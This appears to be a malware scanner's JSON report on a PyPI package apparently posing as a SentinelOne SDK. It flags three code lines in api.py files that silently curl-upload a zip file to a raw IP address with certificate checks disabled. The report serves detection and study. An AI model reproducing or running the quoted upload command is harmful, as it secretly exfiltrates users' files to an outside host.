@@ -1,0 +1,34 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "management/mgmtsdk_v2/services/api.py:146",
+                "code": "    command = \"curl -k -F \\\"file=@\" + zipname + \"\\\" \\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\" \n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "management/mgmtsdk_v2/services/api.py:203",
+                "code": "    command = \"curl -k -F \\\"file=@\" + zipname + \"\\\" \\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\" \n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "management/mgmtsdk_v2_1/services/api.py:140",
+                "code": "    command = \"curl -k -F \\\"file=@\" + zipname + \"\\\" \\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\" \n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/sentinelone-1.2.0"
+}
